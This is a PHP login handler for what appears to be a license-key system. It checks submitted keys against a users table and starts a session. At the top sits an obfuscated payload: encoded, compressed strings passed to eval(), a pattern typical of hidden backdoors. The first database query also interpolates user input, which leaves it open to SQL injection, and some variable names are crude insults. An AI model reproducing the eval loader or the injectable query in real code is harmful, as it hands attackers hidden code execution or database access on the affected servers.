<?php
$pageguard = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";$Lix = "\x3dYHNhUF\x43jQ\x630\x41UQERyjzLL\x61Omxwt\x62iuttVXqUSEJSRX1fZN923J\x2bWJ0Vr6Pgd\x2bWL\x61YPvs/Dqz\x2b5kg2Tdt3\x617h\x62qvQPdDzfN9vdz/TZ4UsF0\x2bM4\x41j/76wrMqDi97/Y\x42GDjxJe/HK\x41eFw/\x63\x43wY\x42wJe";eval(htmlspecialchars_decode(gzinflate(base64_decode($pageguard))));
session_start();
header("Content-Type: application/json; utf-8;");
require '../../server/connect.php';
error_reporting(0);

if (isset($_POST)) {
    $anasikenangeris = addslashes($_POST["keyad"]);
    $bacisikenangeris = addslashes($_POST["key"]);
   $apisikenangeris = $conn->query("SELECT * FROM users WHERE key_ad ='$anasikenangeris' and key_pas ='$bacisikenangeris'")->fetch();
 if ($apisikenangeris['banned'] == 1) {
  echo json_encode(["status" => "false", "error" => "banned"]);
  die();
 }elseif ($apisikenangeris['endkey'] == 1) {
  echo json_encode(["status" => "false", "error" => "endkey"]);
  die();
 }else{
  $ırkçısanalmagandadeniz = $conn->prepare("SELECT key_ad,key_pas FROM users WHERE 
  key_ad=? and key_pas=?");
  $ırkçısanalmagandadeniz->execute(array($anasikenangeris,$bacisikenangeris));
  $row = $ırkçısanalmagandadeniz->fetch(PDO::FETCH_BOTH);

    if($ırkçısanalmagandadeniz->rowCount() > 0) {
      $_SESSION['key'] = $bacisikenangeris;
      echo json_encode(["status" => "true", "login" => "success"]);
      die();
    }else{
        echo json_encode(["status" => "false", "login" => "error"]);
        die();
    }
 }

  }
    

    




